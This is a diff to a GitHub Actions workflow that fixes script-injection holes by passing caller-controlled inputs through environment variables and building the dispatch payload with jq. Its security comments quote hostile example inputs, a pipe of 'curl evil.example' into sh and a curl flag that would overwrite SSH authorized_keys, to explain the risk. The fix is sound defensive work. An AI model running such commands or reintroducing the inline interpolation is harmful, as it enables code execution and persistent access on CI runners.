@@ -70,14 +70,21 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - id: rosetta-generate
+        # SECURITY: `inputs.aspect-config` is passed via the environment rather than
+        # interpolated straight into the script. GitHub substitutes `${{ }}` textually
+        # before bash parses the block, so a caller-controlled value containing shell
+        # metacharacters (`; curl evil.example | sh`, or a `$(...)` substitution) would
+        # execute. Reading it from `$ASPECT_CONFIG` keeps it inert data.
         run: |
           ROSETTA_RESULT=$( \
             rosetta steps \
-            --config ${{ inputs.aspect-config }} \
+            --config "$ASPECT_CONFIG" \
             --gha_task generate \
             --gha_json_pretty_print=false \
           )
           tee "${GITHUB_OUTPUT}" <<< "json=${ROSETTA_RESULT}"
+        env:
+          ASPECT_CONFIG: ${{ inputs.aspect-config }}
     outputs:
       cfg: ${{ steps.rosetta-generate.outputs.json }}
   bazel:
@@ -171,12 +178,33 @@ jobs:
           # under bazel-out and {workspace}/bazel-out.
       - name: Trigger delivery
         # This uses the following API: https://docs.github.com/en/rest/actions/workflows?apiVersion=2022-11-28#create-a-workflow-dispatch-event
+        #
+        # SECURITY: every interpolated value is passed through the environment instead of
+        # being substituted into the script text. `inputs.delivery-workflow` and the
+        # config-derived `branch`/`workspace` are caller-reachable, so inlining them let
+        # a crafted value break out of the quoted JSON and append arbitrary curl flags
+        # (for example `-o ~/.ssh/authorized_keys`) or inject a second command. Building
+        # the payload from shell variables and serializing it with `jq` also escapes
+        # quotes that would otherwise corrupt the JSON body.
         run: |
+          jq -n \
+            --arg ref "$DELIVERY_BRANCH" \
+            --arg delivery_commit "${GITHUB_SHA}" \
+            --arg workspace "$DELIVERY_WORKSPACE" \
+            '{ref: $ref, inputs: {delivery_commit: $delivery_commit, workspace: $workspace}}' \
+            > "${RUNNER_TEMP}/dispatch.json"
+
           curl \
             -X POST \
             -H "Accept: application/vnd.github.v3+json" \
-            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/${{ inputs.delivery-workflow }}/dispatches \
-            -d "{\"ref\":\"${{ fromJson(needs.setup.outputs.cfg).workflows_config[matrix.job].branch }}\",\"inputs\":{\"delivery_commit\":\"${GITHUB_SHA}\",\"workspace\":\"${{ fromJson(needs.setup.outputs.cfg).workflows_config[matrix.job].workspace }}\"}}"
+            -H "Authorization: token ${GITHUB_TOKEN}" \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/${DELIVERY_WORKFLOW}/dispatches" \
+            --data "@${RUNNER_TEMP}/dispatch.json"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITHUB_REPOSITORY: ${{ github.repository }}
+          DELIVERY_WORKFLOW: ${{ inputs.delivery-workflow }}
+          DELIVERY_BRANCH: ${{ fromJson(needs.setup.outputs.cfg).workflows_config[matrix.job].branch }}
+          DELIVERY_WORKSPACE: ${{ fromJson(needs.setup.outputs.cfg).workflows_config[matrix.job].workspace }}
         shell: bash
         if: fromJson(needs.setup.outputs.cfg).workflows_config[matrix.job].delivery
